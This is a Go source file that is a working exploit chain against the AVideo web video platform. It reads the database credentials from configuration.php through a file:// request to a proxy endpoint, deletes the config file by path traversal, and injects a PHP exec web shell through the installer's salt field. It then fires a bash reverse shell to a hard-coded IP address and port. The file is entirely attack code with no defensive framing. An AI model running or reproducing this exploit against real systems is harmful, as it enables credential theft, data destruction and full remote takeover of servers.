package main

import (
	"encoding/json"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/fatih/color"
)

type credential struct {
	mysqlHost string
	mysqlUser string
	mysqlPass string
}

type advancedCustom struct {
	DoNotShowImportMP4Button bool
}

type cookie struct {
	name  string
	value string
}

func checkRequirments(link string) bool {
	var setting advancedCustom
	rs, err := http.Get(link + "plugin/CustomizeAdvanced/advancedCustom.json.php")
	if err != nil {
		color.Red("[x] Unable to check requirments")
		panic(err)
	}
	defer rs.Body.Close()
	jsonRes, err := ioutil.ReadAll(rs.Body)
	if err != nil {
		panic(err)
	} else {
		json.Unmarshal(jsonRes, &setting)

		if setting.DoNotShowImportMP4Button {
			return false
		} else {
			return true
		}

	}
}

func login2cookie(link string, user string, password string) cookie {

	var c cookie
	resp, err := http.PostForm(link+"objects/login.json.php",
		url.Values{"user": {user}, "pass": {password}, "rememberme": {"false"}})

	if err != nil {
		color.Red("[x] Unable to login")
		panic(err)
	}
	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	stringBody := string(body)
	user = strings.Split(strings.Split(stringBody, "\"user\":")[1], ",")[0]

	if user == "false" {

		color.Red("[x] Unable to login (wrong username/password)")
		os.Exit(1)
	}
	for _, cookie := range resp.Cookies() {
		if cookie.Name != "user" && cookie.Name != "pass" && cookie.Name != "rememberme" {
			c.name = cookie.Name
			c.value = cookie.Value
		}
	}

	color.Green("[x] Logged in successfully!")

	return c
}

func readConfig(link string) credential {

	var cred credential
	// File path is set to ubuntu change it based on the server os and filename
	resp, err := http.Get(link + "plugin/LiveLinks/proxy.php?livelink=file:///var/www/html/AVideo/videos/configuration.php")
	if err != nil {
		color.Red("[X] Unable to read config file")
		panic(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	stringBody := string(body)
	cred.mysqlHost = strings.Split(strings.Split(stringBody, "$mysqlHost = '")[1], "'")[0]
	cred.mysqlUser = strings.Split(strings.Split(stringBody, "$mysqlUser = '")[1], "'")[0]
	cred.mysqlPass = strings.Split(strings.Split(stringBody, "$mysqlPass = '")[1], "'")[0]

	color.Green("[X] Config file has been read!")

	return cred
}

func deleteConfig(link string, c cookie) {

	client := &http.Client{}
	PostData := strings.NewReader("delete=1&fileURI=../videos/configuration.php")

	req, err := http.NewRequest("POST", link+"objects/import.json.php", PostData)

	// Set cookie
	req.Header.Set("Cookie", c.name+"="+c.value)

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	_, err = client.Do(req)
	if err != nil {
		color.Red("[x] Unable to delete config file!")
		panic(err)
	}

	color.Green("[x] Config file has been deleted!")

}

func injectCode(link string, cred credential) {

	rceCode := "x';echo exec($_GET[\"x\"]); ?>" // PHP code that will be injected in the configuration file

	client := &http.Client{}

	// Change systemRootPath based on the OS
	PostData := strings.NewReader(`webSiteRootURL=` + link + `&systemRootPath=/var/www/html/avideo/&webSiteTitle=AVideo&databaseHost=` + cred.mysqlHost + `&databasePort=3306&databaseUser=` + cred.mysqlUser + `&databasePass=` + cred.mysqlPass + `&databaseName=aVideo212&mainLanguage=en&systemAdminPass=123456&contactEmail=tes@test.com&createTables=2&salt=` + rceCode)

	req, err := http.NewRequest("POST", link+"install/checkConfiguration.php", PostData)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	_, err = client.Do(req)

	if err != nil {
		color.Red("[x] Unable to inject code!")
		panic(err)
	}

	color.Green("[x] Code has been injected into the config file!")

	// Initiate the reverse shell 

	_, err = http.Get(link + "videos/configuration.php?x=%2Fbin%2Fbash -c 'bash -i > %2Fdev%2Ftcp%2F192.168.153.138%2F8080 0>%261'%0A")
	if err != nil {
		color.Red("[X] Unable to send request!")
		panic(err)
	}
	color.Green("[x] Check your nc ;)")

}

func main() {
	var reqCookie cookie
	var dbCredential credential

	args := os.Args[1:]

	if len(args) < 3 {
		color.Red("Missing arguments")
		os.Exit(1)
	}

	url := args[0] // link
	u := args[1]   // username
	p := args[2]   // password

	// Check doNotShowImportMP4Button status
	if !checkRequirments(url) {
		color.Red("[x] doNotShowImportMP4Button is not disabled! exploit won't work :( if you are admin disable it from advancedCustom plugin")
		os.Exit(1)
	}

	// Get database credentials
	dbCredential = readConfig(url)

	// Get user cookie
	reqCookie = login2cookie(url, u, p)

	// Delete config
	deleteConfig(url, reqCookie)

	// Inject PHP code
	injectCode(url, dbCredential)

}
